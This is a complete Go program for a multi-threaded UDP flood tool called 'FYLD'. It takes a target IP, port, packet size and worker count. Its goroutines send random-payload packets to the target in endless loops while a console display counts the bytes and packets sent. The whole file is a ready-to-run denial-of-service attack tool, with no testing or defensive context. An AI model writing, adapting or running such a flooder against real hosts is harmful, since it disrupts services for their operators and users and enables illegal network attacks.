package main

import (
	"fmt"
	"time"
	"flag"
	"strconv"
	"crypto/rand"
	"sync/atomic"
	"net"
)

var (
	totalBytes   int64
	totalPackets int64
	targetIp     string
	targetPort   int64
	byteSize     int64
	workerCount  int64
)

func worker(ip string, port int64, byteSize int64) {
	targetStr := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.Dial("udp", targetStr)
	if err != nil {
		fmt.Printf("Worker failed to connect to %s: %v\n", targetStr, err)
		return
	}
	defer conn.Close()
	payload := make([]byte, byteSize)
	rand.Read(payload);
	for {
		_, err = conn.Write(payload)
		if err != nil {
			continue
		}
		atomic.AddInt64(&totalPackets, 1)
		atomic.AddInt64(&totalBytes, byteSize)
		time.Sleep(time.Nanosecond * 1)
	}
}

func main() {
	flag.Usage = func() {
		fmt.Println("Invalid input or missing args.")
		fmt.Println("Usage: FYLD -ip <ip> -port <port> -size <size> -workers <workers>")
	}
	targetIpPtr := flag.String("ip", "", "Enter the target ip")
	targetPortPtr := flag.Int64("port", 0, "Enter the target port")
	byteSizePtr := flag.Int64("size", 0, "Enter the byte size")
	workerCountPtr := flag.Int64("workers", 0, "Enter the number of workers")
	flag.Parse()
	if *targetIpPtr == "" || *targetPortPtr == 0 || *byteSizePtr == 0 || *workerCountPtr == 0 {
		fmt.Println("Invalid input or missing args.\nUsage: FYLD -ip <ip> -port <port> -size <size> -workers <workers>")
		return
	}
	targetIp = *targetIpPtr
	targetPort = *targetPortPtr
	byteSize = *byteSizePtr
	workerCount = *workerCountPtr
	for i := 0; int64(i) < workerCount; i++ {
		go worker(targetIp, targetPort, byteSize)
	}
	fmt.Print("\033[H\033[2J\033[3J")
	for {
		fmt.Print("\033[H\033[2J\033[3J")
		fmt.Printf("Flooding %s at port %d with %d bytes per packet using UDP with %d workers\n", targetIp, targetPort, byteSize, workerCount)
		fmt.Printf("\n------------------------------------------------------\n")
		fmt.Printf("Total bytes sent:   %s\n", strconv.FormatInt(totalBytes, 10))
		fmt.Printf("Total packets sent: %s", strconv.FormatInt(totalPackets, 10))
		time.Sleep(time.Second * 1)
	}
}
